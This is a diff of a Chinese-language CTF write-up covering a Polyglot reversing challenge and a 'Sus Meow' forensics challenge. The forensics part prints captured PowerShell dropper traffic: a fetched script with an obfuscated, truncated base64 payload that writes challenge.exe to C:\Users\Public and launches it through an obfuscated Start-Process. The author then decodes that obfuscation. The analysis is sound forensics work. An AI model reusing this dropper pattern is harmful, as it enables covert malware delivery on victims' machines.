@@ -21,6 +21,8 @@ tags:
 
 ## Rev
 
+### Polyglot
+
 题目Polyglot，首先这个单词的英文含义就是`通晓(或使用)多种语言的；用多种语言写成的；通晓并使用多种语言的`,这个也算是一个提示把。
 
 ![题目](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20230115201314.png)
@@ -34,7 +36,7 @@ tags:
 ![X86架构下](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20230115202655.png)
 
 
-## 解题思路
+#### 解题思路
 
 将`Polyglot`分别在`x86`和`ARM`两种架构下，进行反编译操作。通过解析代码流程，逆向解密过程。
 
@@ -46,9 +48,9 @@ tags:
 
 第二个解密操作，汇编代码稍微有点复杂，所以是直接复制的ida反编译之后的函数。然后判断了一下这个函数的参数。
 
-## 解题代码
+#### 解题代码
 
-### x86
+##### x86
 
 ```C++
 # include <stdio.h>
@@ -214,7 +216,7 @@ int main()
 
 ```
 
-### ARM
+##### ARM
 
 ```C++
 # include <stdio.h>
@@ -251,6 +253,73 @@ int main(){
 }
 
 ```
+
+
+
+
+
+## **Sus Meow**
+
+第二个题目，是一段网络通信数据包的二进制文件。用wireshark分析还报错。所以也只能看十六进制显示的内容了。
+
+
+
+然后我就猜着，会不会是这个解压出来的二进制文件，仍然是一个压缩包呢？  于是把`sus-meow ` 更名为`sus-meow.zip`。然后解压缩一下，还真的解压出来了。一个`attachments`的文件夹里面包含了`challenge.pcapng`的文件。
+
+
+
+**这里，我又去查了一下，发现zip压缩、rar压缩，出来的二进制文件。都不是以`attachements/`开头的。但是为啥这种方法就奏效了？，难道本身就是文件目录转换为的二进制？**
+
+
+
+现在可以用wireshark分析`challenge.pcapng`了。追踪流之后，感觉像是用PowerShell 给服务器发指令+加密的恶意代码，然后让服务器解密+运行恶意代码。解密可以明显的看到用的是`FromBase64String`
+
+```
+GET /muahaha.ps1 HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
+Host: 10.0.2.15
+Connection: Keep-Alive
+
+HTTP/1.0 200 OK
+Server: SimpleHTTP/0.6 Python/3.10.8
+Date: Wed, 11 Jan 2023 11:02:35 GMT
+Content-type: application/octet-stream
+Content-Length: 108368
+Last-Modified: Wed, 11 Jan 2023 10:55:29 GMT
+
+$cph8=("{4}{8}{1}{6}{3}{7}{0}{5}{2}{11}{9}{10}" -f
+'3URi0QkHDmEJJgAAAAPhLMCAACNjCSUAAAAi0UAMdKNdQSJDCSJ0Yn1id6Jwrh4AAAA6K3h///pEfr//4uUJJgAAACDyiCJlCSYAAAA9sIED4Ve/f//3UUAjXUI2cDZ5Zvf4GYlAEVmPQABD4SzAgAA23wkQNtsJEAPt3wkSGaF/3kKgMqAiZQkmAAAANnlm9/g3dhmJQBFZj0ABQ+EfAMAANt8JDCLRCQwi1QkNGaB5/9/D4RMAwAAZoH/ADwPjxwCAAAPv++5ATwAACnpMe0PrdDT6vbBIA9Fwg9F1QH5jbkEwP/
+··········
+
+$lUOIoOXye4ZWRJ79vwRvpERQ = ('{2}{3}{0}{5}{4}{1}' -f 's\Pub','xe','C:\Us','er','lenge.e','lic\chal')
+
+$xP6FknJVZBb = [Convert]::FromBase64String($cph8)
+[IO.File]::WriteAllBytes($lUOIoOXye4ZWRJ79vwRvpERQ, $xP6FknJVZBb)
+& ([string]::join('', ( (83,116,97,114,116,45,80,114,111,99,101,115,115) |%{ ( [char][int] $_)})) | % {$_}) ('{2}{3}{0}{5}{4}{1}' -f 's\Pub','xe','C:\Us','er','lenge.e','lic\chal')
+
+```
+
+后面还有一些关于`powershell的命令`，我大胆的在自己的powershell下面执行了一下`'{2}{3}{0}{5}{4}{1}' -f 's\Pub','xe','C:\Us','er','lenge.e','lic\chal'`--前面的数字其实是后面字符串的位置--拼起来就是`C:\Users\Public\challenge.exe`。这个exe负责存储base64解密之后的数据。
+
+
+
+
+
+最后一行的指令`[string]::join('', ( (83,116,97,114,116,45,80,114,111,99,101,115,115) |%{ ( [char][int] $_)})) | % {$_}`---  先把十进制数转换为char类型，然后用转换后的字符串开启进程，执行exe恶意程序。**具体Poweshell命令的细节，就不写了**  
+
+- 83,116,97,114,116,45,80,114,111,99,101,115,115  -对应的字符串-- `Start-Process`
+
+然后，我就基本上在powershell中执行了一下所有的命令，就是没执行~哈哈哈。 说实在的，这种还是危险的，这里是图懒省事。！~
+
+这样的话，就把恶意程序给找到了`challenge.exe`。
+
+
+
+
+
+之后就是反编译了，目前还没什么线索呢。
+
+
 
 ## 总结
 
